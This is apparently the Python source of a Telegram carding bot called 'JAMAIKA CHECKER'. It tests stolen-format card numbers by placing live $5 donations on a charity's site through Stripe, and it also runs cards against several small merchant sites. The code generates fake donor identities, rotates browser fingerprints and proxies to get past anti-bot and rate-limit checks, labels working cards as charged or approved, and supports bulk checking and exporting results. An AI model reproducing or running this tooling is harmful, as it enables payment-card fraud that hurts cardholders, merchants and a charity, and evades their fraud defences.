# الحالات النهائية التى لا نعيد المحاولة فيها
FINAL_OK   = ("PASSED", "OTP", "LIVE", "CCN", "DECLINED", "INVALID_CARD")


def check_card_with_retry(card_str, site_url):
    """
    يحاول عبر بروكسي ثم يعيد المحاولة، وأخيراً يحاول بدون بروكسي.
    لا يحول فشل الشبكة/البوابة إلى DECLINED كاذب.
    """
    last_status, last_reason = "ERROR", "لم تكتمل أى محاولة"

    attempts = []
    for _ in range(max(1, proxy_pool.max_retries)):
        attempts.append(True)      # محاولة عبر بروكسي
    attempts.append(False)         # محاولة أخيرة بدون بروكسي (مباشر)

    for i, use_proxy in enumerate(attempts):
        proxy = proxy_pool.get_proxy() if use_proxy else None
        status, reason = check_card_on_site(card_str, site_url, proxy)
        last_status, last_reason = status, reason

        if status in FINAL_OK:
            if proxy:
                proxy_pool.report_success(proxy)
            return status, reason

        # فشل بنية تحتية → عاقب البروكسي وأعد المحاولة
        if proxy:
            proxy_pool.report_failure(proxy)
        if i < len(attempts) - 1:
            time.sleep(proxy_pool.backoff_factor * (2 ** min(i, 3)))

    return last_status, last_reason


# ═══════════════════════════════════════
# بوابات الفحص
# ═══════════════════════════════════════
GATES = {
    'new': {
        'name':  '🌊 CharityWater Gate',
        'type':  'cw',          # CharityWater API gate
        'site':  'https://www.charitywater.org',
    },
    '1': {'name': '🏦 بوابة 1', 'site': 'https://copenhagensilver.com'},
    '2': {'name': '💳 بوابة 2', 'site': 'https://www.spokaneshirtco.com'},
    '3': {'name': '🔥 بوابة 3', 'site': 'https://www.4allpromos.com'},
    '4': {'name': '🔑 بوابة 4', 'site': 'https://www.hornbakersrepairandwelding.com',
          'pk': 'pk_live_zGPdg7zDlr9xTBUdMWEMoZxJ',
          'stripe_referer': 'https://www.hornbakersrepairandwelding.com/checkout/'},
}

# ════════════════════════════════════════
# CharityWater Gate — API بدون متصفح
# ════════════════════════════════════════
CW_BASE      = "https://www.charitywater.org"
CW_PK        = "pk_live_51049Hm4QFaGycgRKOIbupRw7rf65FJESmPqWZk9Jtpf2YCvxnjMAFX7dOPAgoxv9M2wwhi5OwFBx1EzuoTxNzLJD00ViBbMvkQ"
CW_STRIPE_VER = "2026-03-25.dahlia"
CW_CAMPAIGN   = "e312f371-fcd2-446e-8b51-c6c393b2b0af"
# ── Rotating UA pool — كل UA معه sec-ch-ua مطابق تماماً ────────────────────
# CW's WAF بيتحقق إن Chrome version في UA == version في sec-ch-ua
# لو مختلفين → كشف فورى كـ bot
CW_UA_POOL = [
    {
        "ua":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "ch_ua":    '"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="99"',
        "platform": '"Windows"',
        "mobile":   "?0",
    },
    {
        "ua":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "ch_ua":    '"Chromium";v="134", "Google Chrome";v="134", "Not-A.Brand";v="99"',
        "platform": '"Windows"',
        "mobile":   "?0",
    },
    {
        "ua":       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "ch_ua":    '"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="99"',
        "platform": '"macOS"',
        "mobile":   "?0",
    },
    {
        "ua":       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "ch_ua":    '"Chromium";v="134", "Google Chrome";v="134", "Not-A.Brand";v="99"',
        "platform": '"macOS"',
        "mobile":   "?0",
    },
    {
        "ua":       "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "ch_ua":    '"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="99"',
        "platform": '"Linux"',
        "mobile":   "?0",
    },
]
# الـ fallback لو كود آخر لا يزال يستخدم CW_UA مباشرة
CW_UA = CW_UA_POOL[0]["ua"]

CW_DOMAINS = ["hotmail.com"]*3 + ["outlook.com"]*3 + ["yahoo.com"]*2 + ["gmail.com"]
CW_FIRSTS  = ["James","Oliver","Liam","Noah","Emma","Sophia","Lucas",
              "Henry","Ella","Grace","Mason","Ethan","Chloe","Ryan"]
CW_LASTS   = ["Smith","Johnson","Williams","Brown","Jones","Garcia",
              "Miller","Davis","Wilson","Taylor","Anderson","Thomas"]
CW_US = [
    ("10022","NY"),("90210","CA"),("60601","IL"),("77001","TX"),
    ("85001","AZ"),("19101","PA"),("30301","GA"),("98101","WA"),
    ("80201","CO"),("33101","FL"),("02101","MA"),("30301","GA"),
]

def _cw_uuid():
    return str(uuid.uuid4()) + secrets.token_hex(3)

def _cw_identity():
    first = random.choice(CW_FIRSTS); last = random.choice(CW_LASTS)
    name  = "".join(random.choices(string.ascii_lowercase, k=7))
    email = f"{name}{random.randint(10,999)}@{random.choice(CW_DOMAINS)}"
    zp, st = random.choice(CW_US)
    phone  = f"+1{random.randint(2020000000,9999999999)}"
    return {"first": first, "last": last,
            "name": f"{first} {last}", "email": email,
            "zip": zp, "state": st, "phone": phone}

def check_cw_gate(card_str, proxy=None):
    """
    CharityWater card checker — 3 steps:
      0. Visit CW page (get cookies + bypass anti-bot)
      1. Stripe /v1/confirmation_tokens
      2. charitywater.org/donate/stripe
    Returns (status, reason)
    status: CHARGED | APPROVED | DECLINED | ERROR
    """
    parts = card_str.split('|')
    if len(parts) != 4:
        return "ERROR", "Bad card format"
    cc, month, year, cvv = parts
    if len(year) == 2:
        year = "20" + year

    ident   = _cw_identity()
    guid    = _cw_uuid(); muid = _cw_uuid(); sid = _cw_uuid()
    cid     = str(uuid.uuid4())
    proxy_d = parse_proxy(proxy) if proxy else None

    # ── اختيار UA profile عشوائى — UA + sec-ch-ua متطابقان دائماً ──────────
    ua_prof = random.choice(CW_UA_POOL)

    # Browser-like headers shared by all requests
    browser_headers = {
        "User-Agent":         ua_prof["ua"],
        "Accept-Language":    random.choice(["en-US,en;q=0.9", "en-US,en;q=0.8,en-GB;q=0.7"]),
        "Accept-Encoding":    "gzip, deflate, br, zstd",
        "Origin":             CW_BASE,
        "Referer":            CW_BASE + "/#give",
        "sec-ch-ua":          ua_prof["ch_ua"],
        "sec-ch-ua-mobile":   ua_prof["mobile"],
        "sec-ch-ua-platform": ua_prof["platform"],
        "sec-fetch-site":     "same-origin",
        "sec-fetch-mode":     "cors",
        "sec-fetch-dest":     "empty",
    }

    # Use a session so cookies carry between requests (critical for anti-bot)
    sess = requests.Session()
    sess.headers.update(browser_headers)

    try:
        # ── Step 0: Visit CW page to get cookies ────────────────────────────
        _ssl_verify = proxy_ssl_verify(proxy)
        got_cookies = False
        for _attempt in range(2):
            try:
                _r0 = sess.get(
                    CW_BASE + "/#give",
                    proxies=proxy_d, timeout=15,
                    headers={"Accept": "text/html,application/xhtml+xml,*/*;q=0.8"},
                    allow_redirects=True,
                    verify=_ssl_verify,
                )
                if _r0.status_code == 200 and sess.cookies:
                    got_cookies = True
                    break
                time.sleep(0.5)
            except Exception:
                time.sleep(0.5)
        if not got_cookies:
            logger.warning(f"[CW] {cc[:6]}... Step0 cookie fetch failed — continuing anyway")
        time.sleep(0.3)   # small human-like delay

        # ── Step 1: Stripe confirmation_token ───────────────────────────────
        stripe_data = {
            "payment_method_data[billing_details][email]":              ident["email"],
            "payment_method_data[billing_details][name]":               ident["name"],
            "payment_method_data[billing_details][address][postal_code]": ident["zip"],
            "payment_method_data[billing_details][address][country]":   "US",
            "payment_method_data[type]":                                "card",
            "payment_method_data[card][number]":                        cc,
            "payment_method_data[card][cvc]":                           cvv,
            "payment_method_data[card][exp_year]":                      year[-2:],
            "payment_method_data[card][exp_month]":                     month,
            "payment_method_data[allow_redisplay]":                     "unspecified",
            "payment_method_data[pasted_fields]":                       "number",
            "payment_method_data[payment_user_agent]":
                "stripe.js/8108d17579; stripe-js-v3/8108d17579; payment-element; deferred-intent",
            "payment_method_data[referrer]":    CW_BASE,
            "payment_method_data[time_on_page]": str(random.randint(300000, 900000)),
            "payment_method_data[guid]":  guid,
            "payment_method_data[muid]":  muid,
            "payment_method_data[sid]":   sid,
            "payment_method_data[client_attribution_metadata][client_session_id]":             cid,
            "payment_method_data[client_attribution_metadata][merchant_integration_source]":   "elements",
            "payment_method_data[client_attribution_metadata][merchant_integration_subtype]":  "payment-element",
            "payment_method_data[client_attribution_metadata][merchant_integration_version]":  "2021",
            "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]":  "deferred",
            "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "merchant_specified",
            "payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]": "payment",
            "setup_future_usage":                      "off_session",
            "client_context[currency]":                "usd",
            "client_context[mode]":                    "subscription",
            "client_context[payment_method_types][0]": "card",
            "client_attribution_metadata[client_session_id]":             cid,
            "client_attribution_metadata[merchant_integration_source]":   "elements",
            "client_attribution_metadata[merchant_integration_subtype]":  "payment-element",
            "client_attribution_metadata[merchant_integration_version]":  "2021",
            "client_attribution_metadata[payment_intent_creation_flow]":  "deferred",
            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
            "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
            "key":             CW_PK,
            "_stripe_version": CW_STRIPE_VER,
        }
        r1 = requests.post(   # Stripe: always direct — proxy providers block CONNECT to api.stripe.com
            "https://api.stripe.com/v1/confirmation_tokens",
            data=stripe_data,
            headers={
                "Authorization":   f"Bearer {CW_PK}",
                "Content-Type":    "application/x-www-form-urlencoded",
                "Origin":          CW_BASE,
                "Referer":         CW_BASE + "/",
                "User-Agent":      CW_UA,
                "Accept":          "application/json",
                "Accept-Language": "en-US,en;q=0.9",
            },
            proxies=None, timeout=30,
        )
        try:
            r1j = r1.json()
        except Exception:
            err = f"Stripe parse error HTTP {r1.status_code}: {r1.text[:120]}"
            logger.error(f"[CW-Stripe] {cc[:6]}... {err}")
            return "ERROR", err

        if "error" in r1j:
            e = r1j["error"]
            t = e.get("type",""); c_ = e.get("code",""); m_ = e.get("message","")
            logger.info(f"[CW-Stripe] {cc[:6]}... type={t} code={c_} msg={m_}")
            if t == "card_error" or c_ in ("invalid_number","incorrect_number",
                                            "invalid_expiry_month","invalid_expiry_year",
                                            "expired_card","invalid_cvc"):
                return "DECLINED", m_
            return "ERROR", f"Stripe {t}/{c_}: {m_}"

        ctoken = r1j.get("id","")
        if not ctoken:
            logger.error(f"[CW-Stripe] {cc[:6]}... no token in response: {str(r1j)[:120]}")
            return "ERROR", "No confirmation_token"
        logger.info(f"[CW-Stripe] {cc[:6]}... got token {ctoken[:20]}")

        # ── Step 2: CharityWater donate ─────────────────────────────────────
        cw_data = {
            "country":                                         "us",
            "payment_intent[email]":                           ident["email"],
            "payment_intent[amount]":                          "5",
            "payment_intent[currency]":                        "usd",
            "payment_intent[metadata][donation_kind]":         "water",
            "payment_intent[confirmation_token]":              ctoken,
            "payment_intent[setup_future_usage]":              "off_session",
            "disable_existing_subscription_check":             "false",
            "donation_form[amount]":                           "5",
            "donation_form[anonymous]":                        "true",
            "donation_form[comment]":                          "",
            "donation_form[display_name]":                     "",
            "donation_form[email]":                            ident["email"],
            "donation_form[name]":                             ident["first"],
            "donation_form[payment_gateway_token]":            "",
            "donation_form[payment_monthly_subscription]":     "true",
            "donation_form[surname]":                          ident["last"],
            "donation_form[campaign_id]":                      CW_CAMPAIGN,
            "donation_form[setup_intent_id]":                  "",
            "donation_form[subscription_period]":              "monthly",
            "donation_form[metadata][donation_kind]":          "water",
            "donation_form[metadata][email_consent_granted]":  "true",
            "donation_form[metadata][phone_number]":           ident["phone"],
            "donation_form[metadata][phone_number_consent_granted]": "false",
            "donation_form[metadata][referer]":                CW_BASE + "/donate",
            "donation_form[metadata][strict_consent_region]":  "false",
            "donation_form[metadata][with_saved_payment]":     "false",
            "donation_form[metadata][full_donate_page_url]":   CW_BASE + "/#give",
            "donation_form[address][address_line_1]":          "",
            "donation_form[address][city]":                    "",
            "donation_form[address][country]":                 "",
            "donation_form[address][zip]":                     "",
            "subscription[amount]":    "5",
            "subscription[country]":   "us",
            "subscription[email]":     ident["email"],
            "subscription[full_name]": ident["name"],
            "subscription[is_annual]": "false",
            "idempotency_key":         str(uuid.uuid4()),
        }
        # تأخير بشري قبل إرسال الـ donate — يقلل احتمال الـ 418
        time.sleep(random.uniform(1.0, 2.8))

        r2 = sess.post(
            f"{CW_BASE}/donate/stripe",
            data=cw_data,
            headers={
                "Content-Type":       "application/x-www-form-urlencoded",
                "Accept":             "application/json, text/plain, */*",
                "Referer":            CW_BASE + "/#give",
                "User-Agent":         ua_prof["ua"],        # ← نفس UA المختار أعلاه
                "X-Requested-With":   "XMLHttpRequest",
                "sec-ch-ua":          ua_prof["ch_ua"],     # ← مطابق للـ UA دائماً
                "sec-ch-ua-mobile":   ua_prof["mobile"],
                "sec-ch-ua-platform": ua_prof["platform"],
            },
            proxies=proxy_d, timeout=40,
            verify=_ssl_verify,
        )
        try:
            r2j = r2.json()
        except Exception:
            logger.info(f"[CW-Donate] {cc[:6]}... HTTP {r2.status_code} non-JSON: {r2.text[:120]}")
            if r2.status_code in (200, 201):
                return "CHARGED", "Donation accepted"
            if r2.status_code == 418:
                # 418 = CW anti-bot / rate-limit — يُعالَج بـ backoff + IP جديد
                return "RATE_LIMITED", "CW 418 — anti-bot / rate-limited"
            return "ERROR", f"CW HTTP {r2.status_code}: {r2.text[:80]}"

        logger.info(f"[CW-Donate] {cc[:6]}... HTTP {r2.status_code} JSON: {str(r2j)[:200]}")

        if "error" in r2j:
            msg = r2j["error"].get("message","") or r2j["error"].get("code","")
            low = msg.lower()
            if "insufficient" in low:
                return "APPROVED", "Approved (insufficient funds)"
            if any(x in low for x in ["declined","invalid","expired","lost","stolen","blocked"]):
                return "DECLINED", msg
            return "ERROR", msg

        if r2j.get("success") or r2j.get("donation") or r2j.get("id"):
            return "CHARGED", "Donation accepted — Charged!"

        return "ERROR", f"Unknown CW response: {str(r2j)[:120]}"

    except requests.exceptions.ProxyError as e:
        logger.warning(f"[CW] {cc[:6]}... ProxyError: {e}")
        return "ERROR", f"Proxy error: {str(e)[:80]}"
    except requests.exceptions.Timeout:
        logger.warning(f"[CW] {cc[:6]}... Timeout")
        return "ERROR", "Timeout"
    except Exception as e:
        logger.error(f"[CW] {cc[:6]}... {type(e).__name__}: {e}")
        return "ERROR", f"{type(e).__name__}: {str(e)[:80]}"

_NETWORK_ERRS = ('timeout', 'connection', 'proxy', 'refused', 'reset', 'eof',
                 'remotedisconnected', 'ssl', 'name or service not known')

def _is_network_error(reason):
    r = (reason or '').lower()
    return any(k in r for k in _NETWORK_ERRS)

def check_cw_with_retry(card_str):
    """
    Retry CharityWater gate مع حماية من الـ 418.
    - السيمافور يمنع أكتر من 3 طلبات متزامنة لـ CW
    - RATE_LIMITED (418) → IP جديد + انتظار تصاعدى قبل إعادة المحاولة
    - محاولات: [proxy, proxy, direct]
    """
    last_status, last_reason = "ERROR", "No attempts completed"
    attempts = [True, True, False]   # proxy, proxy, direct

    for i, use_proxy in enumerate(attempts):
        proxy = proxy_pool.get_proxy() if use_proxy else None
        try:
            with _CW_SEMAPHORE:   # ← max 3 concurrent CW checks
                status, reason = check_cw_gate(card_str, proxy)
        except Exception as e:
            status, reason = "ERROR", f"{type(e).__name__}: {str(e)[:120]}"

        last_status, last_reason = status, reason
        logger.info(f"[CW] {card_str[:16]}... attempt {i+1} proxy={bool(proxy)} → {status}: {reason[:80]}")

        # ── نجاح حقيقى ──────────────────────────────────────────────────────
        if status in ("CHARGED", "APPROVED", "DECLINED"):
            if proxy:
                proxy_pool.report_success(proxy)
            return status, reason

        # ── 418 rate-limit: IP جديد + انتظار تصاعدى ─────────────────────────
        if status == "RATE_LIMITED":
            if i < len(attempts) - 1:
                wait = 6 + i * 4   # محاولة 1→6s، محاولة 2→10s
                logger.info(
                    f"[CW] {card_str[:16]}... 418 rate-limit — waiting {wait}s then fresh IP"
                )
                time.sleep(wait)
            continue   # get_proxy() سيولّد session جديد = IP جديد في الدورة القادمة

        # ── أخطاء شبكة: عاقب البروكسي ───────────────────────────────────────
        if proxy and _is_network_error(reason):
            proxy_pool.report_failure(proxy)
        elif proxy:
            proxy_pool.report_success(proxy)

        if i < len(attempts) - 1:
            time.sleep(1.5)

    return last_status, last_reason


def _check_one_card(card_str, gate_id):
    """Route card to correct checker based on gate type."""
    gate = GATES[gate_id]
    if gate.get('type') == 'cw':
        return check_cw_with_retry(card_str)
    return check_card_with_retry(card_str, gate['site'])


def format_cw_result(status, reason, card_str, bin_inf):
    """Format result in the styled BM Vortex format."""
    icon, label = STATUS_LABEL.get(status, ("⚠️", status))
    bin6  = card_str.split('|')[0][:6]
    brand = (bin_inf.get('brand') or '?').upper()
    ctype = (bin_inf.get('type')  or '?').upper()
    bank  = bin_inf.get('bank',    'Unknown')
    cntry = (bin_inf.get('country') or 'Unknown').upper()
    flag  = bin_inf.get('flag', '🌍')
    return (
        f"{icon} *{label}*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"𝐂𝐚𝐫𝐝 ➜ `{card_str}`\n"
        f"𝐁𝐈𝐍 ➜ {bin6} - {ctype} - {brand}\n"
        f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {cntry} - {flag}\n"
        f"𝐁𝐚𝐧𝐤 ➜ {md_escape(bank)}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Check by ➜ 𝓑𝓜〆𝓥𝓞𝓡𝓣𝓔𝓧"
    )


def _is_hit(status, gate_id):
    if GATES[gate_id].get('type') == 'cw':
        return status in ('CHARGED', 'APPROVED')
    return status in ('PASSED', 'OTP', 'LIVE', 'CCN')


_bin_cache      = {}          # {bin6: result_dict}
_bin_cache_lock = threading.Lock()
_bin_last_call  = [0.0]       # rate-limit tracker (1 call per 0.6s)

def get_bin_info(bin6):
    bin6 = str(bin6)[:6]

    # ── 1. Cache hit ─────────────────────────────────────────────────────────
    with _bin_cache_lock:
        if bin6 in _bin_cache:
            return _bin_cache[bin6]

    EMPTY = {"brand": "?", "type": "?", "bank": "?", "country": "?", "flag": "🌍"}
    HDR   = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}

    result = None

    # ── 2. Primary: bins.antipublic.cc (no rate limit, large DB) ─────────────
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin6}", headers=HDR, timeout=8)
        if r.status_code == 200:
            d = r.json()
            if d.get("brand") or d.get("bank"):
                result = {
                    "brand":   (d.get("brand")        or "?").upper(),
                    "type":    (d.get("type")          or "?").upper(),
                    "bank":    d.get("bank")           or "?",
                    "country": d.get("country_name")   or d.get("country") or "?",
                    "flag":    d.get("country_flag")   or "🌍",
                }
    except Exception:
        pass

    # ── 3. Fallback: lookup.binlist.net ──────────────────────────────────────
    if result is None:
        try:
            with _bin_cache_lock:
                wait = 0.6 - (time.time() - _bin_last_call[0])
                if wait > 0:
                    time.sleep(wait)
                _bin_last_call[0] = time.time()
            r = requests.get(f"https://lookup.binlist.net/{bin6}",
                             headers={**HDR, "Accept-Version": "3"}, timeout=6)
            if r.status_code == 200:
                d = r.json()
                if d.get("scheme") or d.get("type"):
                    result = {
                        "brand":   (d.get("scheme")  or "?").upper(),
                        "type":    (d.get("type")     or "?").upper(),
                        "bank":    (d.get("bank")     or {}).get("name") or "?",
                        "country": (d.get("country")  or {}).get("name") or "?",
                        "flag":    (d.get("country")  or {}).get("emoji") or "🌍",
                    }
        except Exception:
            pass

    # ── 4. Fallback 2: binlookup.io ──────────────────────────────────────────
    if result is None:
        try:
            r = requests.get(f"https://binlookup.io/api/bin/{bin6}", headers=HDR, timeout=6)
            if r.status_code == 200:
                d = r.json()
                inner = d.get("bin") or d
                if inner.get("brand") or inner.get("type"):
                    result = {
                        "brand":   (inner.get("brand")        or "?").upper(),
                        "type":    (inner.get("type")         or "?").upper(),
                        "bank":    inner.get("bank_name") or inner.get("bank") or "?",
                        "country": inner.get("country_name") or inner.get("country") or "?",
                        "flag":    inner.get("country_flag")  or "🌍",
                    }
        except Exception:
            pass

    if result is None:
        result = EMPTY

    with _bin_cache_lock:
        _bin_cache[bin6] = result
    return result

# ═══════════════════════════════════════
# الحالة العامة
# ═══════════════════════════════════════
user_main_message  = {}   # {user_id: message_id}  - fixed banner message
user_gate_choice   = {}   # {user_id: gate_id}
user_session_state = {}   # {user_id: state_str}
admin_session      = {}   # {user_id: admin_state}
user_bulk_results  = {}   # {user_id: [result_lines]} for export

# ═══════════════════════════════════════
# نص القائمة الرئيسية
# ═══════════════════════════════════════
MAIN_CAPTION = (
    "🌟 *JAMAIKA CHECKER* 🌟\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "Professional Card Checker Bot\n\n"
    "Select an option from the menu 👇"
)

CARD_FORMAT_HELP = (
    "❌ *No valid card detected!*\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "Bot accepts *any separator* between fields:\n"
    "`4111111111111111|12|2025|123`\n"
    "`4111111111111111:12:25:123`\n"
    "`4111111111111111 12 25 123`\n"
    "`4111111111111111/12/25/123`\n"
    "`4111-1111-1111-1111/12/25/123`\n"
    "`4111111111111111,12/25,123`\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "⚠️ Card number must pass Luhn check\n"
    "Month: 1-12 | Year: 2000-2099 | CVV: 3 or 4 digits"
)

# ═══════════════════════════════════════
# بناء الكيبوردات — ألوان حقيقية (Bot API 9.4)
# ═══════════════════════════════════════
# Telegram أضاف خاصية style للأزرار فى Bot API 9.4 (9 فبراير 2026).
# الألوان المتاحة 3 فقط:  primary أزرق | success أخضر | danger أحمر
# الدعم فى pyTelegramBotAPI بدأ من الإصدار 4.31.0
STYLE_PRIMARY = "primary"   # 🔵 أزرق — الإجراءات الرئيسية
STYLE_SUCCESS = "success"   # 🟢 أخضر — الإجراءات الإيجابية
STYLE_DANGER  = "danger"    # 🔴 أحمر — الإجراءات الحساسة/الرجوع

# تحقق دقيق من دعم style: هل المكتبة تقبل الوسيط *وتُدرجه في to_dict*؟
STYLE_SUPPORTED = False
try:
    # إنشاء زر تجريبي مع style
    _probe = types.InlineKeyboardButton("t", callback_data="t", style=STYLE_PRIMARY)
    # التحقق من أن style ظهر في التمثيل المسلسل (الضمان الوحيد للفعالية)
    if hasattr(_probe, 'to_dict'):
        d = _probe.to_dict()
        if isinstance(d, dict) and d.get('style') == STYLE_PRIMARY:
            STYLE_SUPPORTED = True
except Exception:
    pass

if not STYLE_SUPPORTED:
    logger.warning(
        "pyTelegramBotAPI version does not support button colors (style). "
        "To enable colors: update library with:\n"
        "   pip install -U 'pyTelegramBotAPI>=4.31.0'"
    )

def btn(text, style=None, **kwargs):
    """زر إنلاين مع لون — يمرر style فقط إذا كان مدعومًا فعليًا"""
    if style and STYLE_SUPPORTED:
        return types.InlineKeyboardButton(text, style=style, **kwargs)
    # إزالة style من kwargs تجنبًا لأي استثناء في المكتبات القديمة
    kwargs.pop('style', None)
    return types.InlineKeyboardButton(text, **kwargs)

def main_menu_kb(user_id=None):
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        btn("💳 Check Card",   STYLE_SUCCESS, callback_data="menu_single"),
        btn("📋 Bulk Check",   STYLE_PRIMARY, callback_data="menu_bulk"),
    )
    kb.add(
        btn("👤 My Account",   STYLE_PRIMARY, callback_data="menu_account"),
        btn("🎫 Redeem Code",  STYLE_SUCCESS, callback_data="menu_redeem"),
    )
    kb.add(
        btn("⚙️ Settings",     STYLE_PRIMARY, callback_data="menu_settings"),
        btn("🔍 Gate Scanner", STYLE_PRIMARY, callback_data="menu_gate_scan"),
    )
    if user_id and user_id == ADMIN_ID:
        kb.add(btn("🛠️ Admin Panel", STYLE_DANGER, callback_data="menu_admin"))
    kb.add(
        btn("🆘 Support", STYLE_PRIMARY, url="https://t.me/BaBa_MeDia_0"),
    )
    return kb

def back_kb():
    kb = types.InlineKeyboardMarkup()
    kb.add(btn("🏠 Main Menu", STYLE_DANGER, callback_data="main_menu"))
    return kb

def gates_kb(mode):
    kb = types.InlineKeyboardMarkup(row_width=1)
    for gid, info in GATES.items():
        style = STYLE_SUCCESS if gid == 'new' else STYLE_PRIMARY
        kb.add(btn(info['name'], style, callback_data=f"gate_{gid}_{mode}"))
    kb.add(btn("🏠 Main Menu", STYLE_DANGER, callback_data="main_menu"))
    return kb

def after_check_kb(mode):
    kb = types.InlineKeyboardMarkup(row_width=1)
    label = "🔄 Check Another Card"  if mode == 'single' else "🔄 Check Another Batch"
    cb    = "menu_single"             if mode == 'single' else "menu_bulk"
    kb.add(btn(label, STYLE_SUCCESS, callback_data=cb))
    kb.add(btn("🏠 Main Menu", STYLE_DANGER, callback_data="main_menu"))
    return kb

def after_bulk_kb(has_export=False):
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(btn("🔄 Check Another Batch", STYLE_SUCCESS, callback_data="menu_bulk"))
    if has_export:
        kb.add(btn("📤 Export Results (.txt)", STYLE_PRIMARY, callback_data="export_results"))
    kb.add(btn("🏠 Main Menu", STYLE_DANGER, callback_data="main_menu"))
    return kb

# ═══════════════════════════════════════
# إرسال / تحديث رسالة البانر
# ═══════════════════════════════════════
def send_banner(chat_id, user_id, caption, markup):
    """إرسال رسالة البانر جديدة وحفظ معرفها"""
    global BANNER_FILE_ID

    # احذف الرسالة القديمة إن وُجدت
    old_id = user_main_message.get(user_id)
    if old_id:
        try:
            bot.delete_message(chat_id, old_id)
        except:
            pass

    photo = None
    if BANNER_FILE_ID:
        photo = BANNER_FILE_ID
    elif os.path.exists(BANNER_PATH):
        photo = open(BANNER_PATH, 'rb')

    try:
        if photo:
            msg = bot.send_photo(chat_id, photo, caption=caption,
                                 reply_markup=markup, parse_mode="Markdown")
            if not BANNER_FILE_ID:
                BANNER_FILE_ID = msg.photo[-1].file_id
            if hasattr(photo, 'close'):
                photo.close()
        else:
            msg = bot.send_message(chat_id, caption,
                                   reply_markup=markup, parse_mode="Markdown")
        user_main_message[user_id] = msg.message_id
        return msg.message_id
    except Exception as e:
        logger.error(f"send_banner error: {e}")
        return None

def _is_not_modified(exc):
    """Telegram يرفض التعديل حين تكون الرسالة مطابقة تماماً — ليست خطأ حقيقياً."""
    return "message is not modified" in str(exc).lower()

def edit_banner(user_id, chat_id, caption, markup, msg_id=None):
    """تحديث رسالة البانر الموجودة (الكابشن والأزرار فقط)"""
    mid = msg_id or user_main_message.get(user_id)
    if not mid:
        return send_banner(chat_id, user_id, caption, markup)
    try:
        bot.edit_message_caption(
            caption=caption, chat_id=chat_id, message_id=mid,
            reply_markup=markup, parse_mode="Markdown"
        )
        user_main_message[user_id] = mid
        return mid
    except Exception as e:
        if _is_not_modified(e):
            return mid
        # بدون baner.webp تُرسل الرسالة كنص عادى بلا كابشن، فيفشل تعديل الكابشن.
        # نعدّل النص نفسه بدل حذف الرسالة وإعادة إرسالها في كل ضغطة زر.
        try:
            bot.edit_message_text(
                text=caption, chat_id=chat_id, message_id=mid,
                reply_markup=markup, parse_mode="Markdown"
            )
            user_main_message[user_id] = mid
            return mid
        except Exception as e2:
            if _is_not_modified(e2):
                return mid
            logger.warning(f"edit_banner fallback – sending new: {e2}")
            return send_banner(chat_id, user_id, caption, markup)

# ═══════════════════════════════════════
# شريط التقدم
# ═══════════════════════════════════════
STATUS_LABEL = {
    # WooCommerce gate statuses
    "PASSED":         ("✅", "LIVE"),
    "OTP":            ("✅", "Approved — 3D Secure"),
    "LIVE":           ("💚", "LIVE — Insufficient Funds"),
    "CCN":            ("🟡", "CCN — Valid Number / Wrong CVV"),
    "DECLINED":       ("❌", "DECLINED"),
    "INVALID_CARD":   ("🚫", "Invalid Card Data"),
    "GATE_DOWN":      ("⚠️", "Gateway Not Responding"),
    "PROXY_ERROR":    ("⚠️", "Proxy Failed"),
    "ERROR":          ("⚠️", "Unexpected Error"),
    "INVALID_FORMAT": ("🚫", "Invalid Format"),
    # CharityWater gate statuses
    "CHARGED":        ("✅", "CHARGED"),
    "APPROVED":       ("✅", "Approved: (insufficient)"),
}

def md_escape(t):
    """تهريب رموز Markdown حتى لا تفسد رسالة تيليجرام"""
    for ch in ('_', '*', '`', '['):
        t = str(t).replace(ch, '\\' + ch)
    return t

def progress_bar(current, total, length=14):
    if total == 0:
        return "░" * length + "  0%"
    filled = int(length * current / total)
    pct    = int(100 * current / total)
    return "█" * filled + "░" * (length - filled) + f"  {pct}%"

# ═══════════════════════════════════════
# /start
# ═══════════════════════════════════════
@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    try:
        bot.delete_message(chat_id, message.message_id)
    except:
        pass
    user_session_state.pop(user_id, None)
    
    # Ensure user exists in database
    conn = db()
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
    conn.commit()
    conn.close()

    # تجديد الرسالة الموجودة بدل إرسال رسالة جديدة في كل /start
    mid = user_main_message.get(user_id)
    if mid:
        edit_banner(user_id, chat_id, MAIN_CAPTION, main_menu_kb(user_id), msg_id=mid)
    else:
        send_banner(chat_id, user_id, MAIN_CAPTION, main_menu_kb(user_id))

# ═══════════════════════════════════════
# /addproxy ip:port [ip:port ...] — أدمن فقط
# المستخدم يبعت /addproxy 1.2.3.4:8080 5.6.7.8:3128
# ═══════════════════════════════════════
@bot.message_handler(commands=['addproxy'])
def cmd_addproxy(message):
